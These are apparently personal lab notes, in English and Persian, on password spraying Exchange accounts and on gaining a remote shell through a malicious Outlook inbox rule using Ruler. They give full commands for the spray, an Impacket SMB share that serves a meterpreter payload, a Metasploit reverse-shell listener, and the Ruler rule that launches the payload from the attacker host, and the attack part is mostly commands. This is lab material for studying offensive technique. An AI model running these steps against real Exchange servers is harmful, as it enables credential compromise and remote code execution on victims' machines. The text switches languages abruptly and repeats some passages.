
## 

Context

This lab looks at an attacking technique called password spraying as well as abusing Outlook Web Application by exploiting mail rules to get a remote shell using a tool called `Ruler`.

## 

[](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell#defininitions)

Defininitions

**Password spraying** is a form of password brute-forcing attack. In password spraying, an attacker (with the help of a tool) cycles through a list of possible usernames (found using OSINT techniques against a target company or other means) with a couple of most commonly used weak passwords.

In comparison, a traditional brute-force works by selecting a username from the list and trying all the passwords in the wordlist against that username. Once all passwords are exhausted for that user name, another username is chosen from the list and the process repeats.


```
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```

![[Pasted image 20251101120620.png]]



### گرفتن شل (Shell) از طریق قانون مخرب ایمیل

**مرور کلی فرآیند**

اگر حمله‌ی **password spray** علیه سرور Exchange موفقیت‌آمیز باشد و شما اطلاعات ورود معتبر (Credentials) به دست آورده باشید، می‌توانید با کمک ابزار **Ruler** یک **قانون مخرب ایمیل** بسازید که به شما امکان اجرای کد از راه دور (**Remote Code Execution**) روی سیستمی که ایمیل‌های حساب آلوده را بررسی می‌کند، بدهد


### 

Execution

Let's validate the compromised credentials are working by checking if there are any email rules created already:


```
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

«این دستور نشان می‌دهد که اعتبارنامه‌ها (username = spotless، password = 123456) کار می‌کنند و تا کنون برای این حساب هیچ rule ایمیلی تنظیم نشده است.»

و جملهٔ بعدی:
«برای ادامهٔ حمله، یک payload معکوس (reverse meterpreter) ساخته‌ام و آن را به‌صورت یک فایل executable ویندوز در مسیر /root/tools/evilm64.exe ذخیره کرده‌ام.»

«برای ادامهٔ حمله، یک payload معکوسِ meterpreter تولید کرده و آن را به‌صورت یک فایل اجرایی ویندوزی در مسیر `/root/tools/evilm64.exe` ذخیره کرده‌ام.

حالا باید یک اشتراک SMB بسازیم که از میزبان قربانی قابل دسترسی باشد و آن را به محلی که payload (`evilm64.exe`) قرار دارد اشاره دهیم:

```
smbserver.py tools /root/tools/
```

- این دستور (معمولاً از مجموعه‌ی **Impacket** است) یک **SMB server ساده** راه‌اندازی می‌کند که نام اشتراکش `tools` است و محتویات سرور از روی پوشه‌ی محلی `/root/tools/` سرو می‌شود.

- هدف: وقتی Exchange یا کلاینت قربانی بخواهد فایل از مسیر UNC باز کند مثل `\\attacker\tools\evilm64.exe`، سرویس SMB مهاجم فایلی را که مهاجم گذاشته باز/دریافت می‌کند.
    
- اثربخشی: این اتصال می‌تواند باعث شود سرویس Exchange یا کلاینت قربانی **به‌صورت خودکار** به سرور مهاجم وصل شود و معمولاً در طی این تعامل **NTLM credentials** ارسال یا درخواست می‌شود — که مهاجم می‌تواند آن‌ها را capture یا relay کند یا در برخی شرایط payload را دانلود و اجرا کند.

---

سپس یک listener در متاسپلویت راه‌اندازی می‌کنیم تا شِل معکوس ورودی را بگیرد:

```
use exploit/multi/handler 
set lhost 10.0.0.5
set lport 443
exploit
```

---

در نهایت، ابزار ruler را اجرا می‌کنیم و قانون ایمیل مخرب را ایجاد می‌کنیم.»

```
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
```

این دستور با ابزار **ruler** روی mailbox `spotless@offense.local` لاگین می‌کند و یک **Inbox rule** با نام `maliciousrule` می‌سازد که وقتی ایمیلی با subject شامل `popashell` بیاید، عملیاتی را اجرا یا انجام می‌دهد که به یک مسیر UNC (`\\10.0.0.5\tools\evilm64.exe`) اشاره می‌کند. گزینه `--send` غالباً باعث می‌شود یک ایمیل تست با همان subject فرستاده شود تا rule فعال و تست شود.


![[Pasted image 20251101122048.png]]

![[Pasted image 20251101122214.png]]


```
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```

